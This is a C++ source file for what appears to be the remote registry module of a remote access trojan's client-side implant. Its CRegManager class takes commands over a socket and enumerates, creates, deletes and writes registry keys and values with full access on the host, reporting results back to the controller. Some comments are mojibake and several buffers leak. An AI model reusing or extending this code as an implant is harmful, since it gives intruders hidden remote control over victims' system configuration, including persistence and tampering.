// RegManager.cpp: implementation of the CRegManager class.
//
//////////////////////////////////////////////////////////////////////

#include "RegManager.h"
#include "../../Public/Public.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CRegManager::CRegManager(CClientSocket *pClient) : CManager(pClient)
{
	BYTE bToken = TOKEN_REGEDIT;
    pClient->Send(&bToken,1);
}

CRegManager::~CRegManager()
{

}

void CRegManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	
	switch (lpBuffer[0])
	{
	case COMMAND_REG_ENUM:
	if (nSize>=3)
		EnumReg(lpBuffer[1],lpBuffer+2);
	else
		EnumReg(lpBuffer[1],NULL);
	break;
	case COMMAND_REG_CREATEKEY:
		CreateKey(lpBuffer+1);
		break;
	case COMMAND_REG_DELKEY:
		DeleteKey(lpBuffer+1);
		break;
	case COMMAND_REG_DELVAL:
		DeleteVal((char*)lpBuffer+1);
		break;
	case COMMAND_REG_CREATKEY:
		CreateKeyEx((char*)lpBuffer+1);
		break;
	default:
		break;
	}
}
void CRegManager::DeleteVal(char *buf)
{
	ParseKey(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
    if(msg.valsize>0)
	{   
		if(msg.size>0)
		{                //�ȴ�����
	           char* path=new char[msg.size+1];
			   ZeroMemory(path,msg.size+1);
			   memcpy(path,tmp,msg.size);
			   if(!OpenKey(path))
			   {
				   SendError();  
				   return;
			   }
			   tmp+=msg.size;
		}
        
		char* key=new char[msg.valsize+1];
		ZeroMemory(key,msg.valsize+1);
		memcpy(key,tmp,msg.valsize);
		if(DeleteValue(key)){
			SendSucceed();
		}else
			SendError();
	}
}
void CRegManager::CreatSTR(char *buf)
{
	ParseKey(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0)
		{                //�ȴ�����
	           char* path=new char[msg.count+1];
			   ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!OpenKey(path))
			   {
				   SendError();  
				   return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		if(WriteValue(key,tmp))
		{
			SendSucceed();
		}else
		{
			SendError();
		}
		delete[] key;
	}
}

BOOL CRegManager::WriteValue(LPCTSTR lpValueName, LPCTSTR lpValue)
{
	long lReturn=RegSetValueEx(m_hKey,lpValueName,0L,REG_SZ,(const BYTE *) lpValue,_tcslen(lpValue)+1);

   	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
}

BOOL CRegManager::WriteValue(LPCTSTR lpSubKey, DWORD dwVal)
{
	long lReturn=RegSetValueEx(m_hKey,lpSubKey,0L,REG_DWORD,(const BYTE *) &dwVal,sizeof(DWORD));
	
   	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
	
}
enum KEYVALUE
{
	MREG_SZ,
		MREG_DWORD,
		MREG_BINARY,
		MREG_EXPAND_SZ
};
//�����Ӽ�
void CRegManager::CreateKeyEx(char *buf)
{
	switch(buf[0])
	{
	   case MREG_SZ:        //�ַ�
		   CreatSTR(buf+1);
		   break;
	   case MREG_DWORD:       //DWORD
           CreatDWORD(buf+1);
		   break;
	   case MREG_EXPAND_SZ:   //����չ�ַ�
		   CreatEXSTR(buf+1);
		   break;
	   default:
		   break;
	} 
}
enum MYKEY
{
    MHKEY_CLASSES_ROOT,
	MHKEY_CURRENT_USER,
	MHKEY_LOCAL_MACHINE,
	MHKEY_USERS,
	MHKEY_CURRENT_CONFIG
};

void CRegManager::CreatEXSTR(char *buf)
{
	ParseKey(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0)
		{                //�ȴ�����
	           char* path=new char[msg.count+1];
			   ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!OpenKey(path)){
				   SendError();  
				   return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		if(WriteBuf(key,tmp)){
			SendSucceed();
		}else
		{
			SendError();
		}
		delete[] key;
	}
}
BOOL CRegManager::WriteBuf(LPCTSTR lpValueName, LPCTSTR lpValue) 
{
	long lReturn=RegSetValueEx(m_hKey,lpValueName,0L, REG_EXPAND_SZ,(const BYTE *) lpValue,_tcslen(lpValue)+1);
	
   	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	
	return FALSE;
}

DWORD atod(char* ch){
	int len=_tcslen(ch);
	DWORD d=0;
	for(int i=0;i<len;i++){
		int t=ch[i]-48;   //��λ�ϵ�����
		if(ch[i]>57||ch[i]<48){          //��������
			return d;
		}
		d*=10;
		d+=t;
	}
	return d;
}
void CRegManager::CreatDWORD(char *buf)
{
	ParseKey(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0){                //�ȴ�����
	           char* path=new char[msg.count+1];
			   ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!OpenKey(path))
			   {
				   SendError();  
				   return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		DWORD d=atod(tmp);               //��Ϊdword
		if(WriteValue(key,d)){
			SendSucceed();
		}else
		{
			SendError();
		}
		delete[] key;
	}
}

void CRegManager::ParseKey(BYTE bType)
{
	switch(bType)
	{
	   case MHKEY_CLASSES_ROOT:
		   m_hKey=HKEY_CLASSES_ROOT;
		   break;
	   case MHKEY_CURRENT_USER:
		   m_hKey=HKEY_CURRENT_USER;
		   break;
	   case MHKEY_LOCAL_MACHINE:
		   m_hKey=HKEY_LOCAL_MACHINE;
		   break;
	   case MHKEY_USERS:
		   m_hKey=HKEY_USERS;
		   break;
	   case MHKEY_CURRENT_CONFIG:
		   m_hKey=HKEY_CURRENT_CONFIG;
		   break;
	   default:
		   m_hKey=HKEY_LOCAL_MACHINE;
		   break;
	}
}

BOOL CRegManager::OpenKey(LPCTSTR lpSubKey)
{
	HKEY hKey;
	long lReturn=RegOpenKeyEx(m_hKey,lpSubKey,0L,KEY_ALL_ACCESS,&hKey);
	if(lReturn==ERROR_SUCCESS)
	{
        m_hKey=hKey;
		return TRUE;
	}
	return FALSE;
}

BOOL CRegManager::DeleteValue(LPCTSTR lpValueName)
{
	long lReturn=RegDeleteValue(m_hKey,lpValueName);
	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	return FALSE;
}


BOOL CRegManager::MyDeleteKey(LPCTSTR lpSubKey)
{
    long lReturn=RegDeleteKey(m_hKey,lpSubKey);
	
	if(lReturn==ERROR_SUCCESS)
		return TRUE;
	return FALSE;
}

void CRegManager::DeleteKey(LPBYTE lpBuffer)
{
	ParseKey(lpBuffer[0]);

	if(MyDeleteKey((LPCTSTR)(lpBuffer+1)))
		SendSucceed();
	else
		SendError();
}

BOOL CRegManager::MyCreateKey(LPCTSTR lpSubKey)
{
	HKEY hKey;
	DWORD dw;
	long lReturn=RegCreateKeyEx(m_hKey,lpSubKey,0L,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dw);
	
	if(lReturn==ERROR_SUCCESS)
	{
		m_hKey=hKey;
		return TRUE;
	}
	
	return FALSE;
}

void  CRegManager:: CreateKey(LPBYTE lpBuffer)
{
	ParseKey(lpBuffer[0]);

	if(MyCreateKey((char*)(lpBuffer+1)))
	{
		SendSucceed();
	}else
	{
		SendError();
	}
}

LONG CRegManager::IsHaveSubkeys(DWORD & dwRet)
{
    DWORD    cSubKeys;             // number of subkeys
    // Get the class name and the value count.
    LONG lRes = RegQueryInfoKey(
        m_hKey_n,                 // key handle
        NULL,                   // buffer for class name
        NULL,                   // size of class string
        NULL,                   // reserved
        &cSubKeys,              // number of subkeys
        NULL,                   // longest subkey size
        NULL,                   // longest class string
        NULL,                   // number of values for this key
        NULL,                   // longest value name
        NULL,                   // longest value data
        NULL,                   // security descriptor
        NULL);                  // last write time
	dwRet = cSubKeys;
	return lRes;
}


#include "stdio.h"
LPBYTE CRegManager::GetRegInfo()
{
    LPBYTE buf=NULL;
	HKEY   hKey; 			//ע�����ؾ��
    if(RegOpenKeyEx(MKEY,KeyPath,0,KEY_ALL_ACCESS,&hKey)==ERROR_SUCCESS)//��
	{
       	DWORD dwIndex=0,NameCnt,NameMaxLen;
		DWORD KeySize,KeyCnt,KeyMaxLen,MaxDateLen;
        //�����ö����
		if(RegQueryInfoKey(hKey,NULL,NULL,NULL,&KeyCnt,&KeyMaxLen,NULL,&NameCnt,&NameMaxLen,&MaxDateLen,NULL,NULL)!=ERROR_SUCCESS)
		{
			return NULL;
		}
		// ���ݴ�С + 1
		KeySize=KeyMaxLen + 1 + sizeof(BOOL);
		if(KeyCnt>0&&KeySize>1)
		{
			int size=sizeof(REGMSG)+1;
			
			// �����ڴ�
			DWORD datasize=KeyCnt*KeySize+size+1;
			buf=(LPBYTE)LocalAlloc(LPTR, datasize);
			if(buf == NULL) return NULL;
			ZeroMemory(buf,datasize);
			
			
			buf[0]= TOKEN_REG_INFO;    //����ͷ
			REGMSG msg;                //����ͷ
			msg.size=KeySize;// ���ݳ���
			msg.count=KeyCnt;//������
			memcpy(buf+1,&msg,size);
			
			LONG    lRes = ERROR_SUCCESS;


			char *szBuffer = new  char[KeySize];
			for(dwIndex=0;dwIndex<KeyCnt;dwIndex++)		//ö����
			{
				DWORD dwSubs = 0;
				ZeroMemory(szBuffer,KeySize);
				DWORD lpcbName = KeySize;
				RegEnumKeyEx(hKey,dwIndex,szBuffer,&lpcbName,NULL,NULL,NULL,NULL);

				HKEY hkResult = NULL;
				BOOL bRet = FALSE;
				LONG lRes = RegOpenKeyEx(hKey, szBuffer, 0, KEY_READ, &hkResult);
				if (lRes == ERROR_SUCCESS)
					m_hKey_n = hkResult;
				
				lRes = IsHaveSubkeys(dwSubs);
				if(ERROR_SUCCESS != lRes)
				{
					printf("�򲻿�");
				}
				if(0 != dwSubs)
				{
					bRet =TRUE;
					printf("��");
				}else
				{
					printf("û��");
				}

				RegCloseKey(hkResult);

				memcpy(buf+dwIndex*KeySize+size ,&bRet,sizeof(BOOL));

				memcpy(buf+dwIndex*KeySize+size +sizeof(BOOL),szBuffer,lpcbName);
			}
			delete [] szBuffer;
			RegCloseKey(hKey);

			buf=(LPBYTE)LocalReAlloc(buf, datasize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
	}
    return buf;
}


//��ѯ
void CRegManager::EnumReg(BYTE bToken,LPBYTE lpBuffer)
{
	ZeroMemory(KeyPath,MAX_PATH);
	switch(bToken)
	{
	   case MHKEY_CLASSES_ROOT:
		   MKEY=HKEY_CLASSES_ROOT;
		   break;
	   case MHKEY_CURRENT_USER:
		   MKEY=HKEY_CURRENT_USER;
		   break;
	   case MHKEY_LOCAL_MACHINE:
		   MKEY=HKEY_LOCAL_MACHINE;
		   break;
	   case MHKEY_USERS:
		   MKEY=HKEY_USERS;
		   break;
	   case MHKEY_CURRENT_CONFIG:
		   MKEY=HKEY_CURRENT_CONFIG;
		   break;
	   default:
		   MKEY=HKEY_LOCAL_MACHINE;
		   break;
	}
	if(lpBuffer!=NULL)
       _tcscpy(KeyPath,(char*)lpBuffer);

	LPBYTE lpTemp = GetRegInfo();
	if (lpTemp == NULL)
	{
		SendError();
	}
	else
	{
		Send(lpTemp, LocalSize(lpTemp));
    	LocalFree(lpTemp);
	}

	lpTemp = NULL;

	lpTemp = GetRegKey();
    if(lpTemp!=NULL)
	{
		Send(lpTemp, LocalSize(lpTemp));
		LocalFree(lpTemp);
	}
	else
	{
		SendError();
	}
}


LPBYTE CRegManager::GetRegKey()
{
	char	*szValueName;		//��ֵ����
	LPBYTE	 szValueDate;		//��ֵ����
	LPBYTE   buf=NULL;
	HKEY	 hKey;			//ע�����ؾ��
	
    if(RegOpenKeyEx(MKEY,KeyPath,0,KEY_ALL_ACCESS,&hKey)==ERROR_SUCCESS)//��
	{
       	DWORD dwIndex=0,NameSize,NameCnt,NameMaxLen,Type;
		DWORD KeyCnt,KeyMaxLen,DataSize,MaxDateLen;
        //�����ö����
		if(RegQueryInfoKey(hKey,NULL,NULL,NULL,&KeyCnt,&KeyMaxLen,NULL,&NameCnt,&NameMaxLen,&MaxDateLen,NULL,NULL)!=ERROR_SUCCESS)
		{
			return NULL;
		}
		if(NameCnt>0&&MaxDateLen>0)
		{
			DataSize=MaxDateLen+1;
			NameSize=NameMaxLen+100;
			REGMSG  msg;
			msg.count=NameCnt;          //�ܸ���
			msg.size=NameSize;          //���ִ�С
			msg.valsize=DataSize;       //���ݴ�С
			int msgsize=sizeof(REGMSG);
			// ͷ                   ���            ����                ����
			DWORD size=sizeof(REGMSG)+ sizeof(BYTE)*NameCnt+ NameSize*NameCnt+DataSize*NameCnt+10;
			buf=(LPBYTE)LocalAlloc(LPTR, size);
			ZeroMemory(buf,size);
			buf[0]=TOKEN_REG_KEY;         //����ͷ
            memcpy(buf+1,(void*)&msg,msgsize);     //����ͷ
			
            szValueName=(char *)malloc(NameSize);
			szValueDate=(LPBYTE)malloc(DataSize);
			
			LPBYTE tmp=buf+msgsize+1;
			for(dwIndex=0;dwIndex<NameCnt;dwIndex++)	//ö�ټ�ֵ
			{
				ZeroMemory(szValueName,NameSize);
				ZeroMemory(szValueDate,DataSize);
				
				DataSize=MaxDateLen+1;
				NameSize=NameMaxLen+100;
				
				RegEnumValue(hKey,dwIndex,szValueName,&NameSize,NULL,&Type,szValueDate,&DataSize);//��ȡ��ֵ
				
				if(Type==REG_SZ)
				{
					tmp[0]=MREG_SZ;  
				}
				if(Type==REG_DWORD)
				{
					tmp[0]=MREG_DWORD;  
				}
				if(Type==REG_BINARY)
				{
					tmp[0]=MREG_BINARY;
				}
				if(Type==REG_EXPAND_SZ)
				{
					tmp[0]=MREG_EXPAND_SZ;
				}
				tmp+=sizeof(BYTE);
				memcpy(tmp,szValueName,msg.size);
				tmp+=msg.size;
				memcpy(tmp,szValueDate,msg.valsize);
				tmp+=msg.valsize;
			}
			free(szValueName);
			free(szValueDate);
			buf=(LPBYTE)LocalReAlloc(buf, size, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}   
	}
	return buf;
}

//û��ִ�гɹ�
void CRegManager::SendError()
{
	BYTE bToken=TOKEN_REG_ERROR;
	Send(&bToken, sizeof(BYTE));
}

void CRegManager::SendSucceed()
{
	BYTE bToken=TOKEN_REG_SUCCEED;
	Send(&bToken, sizeof(BYTE));
}
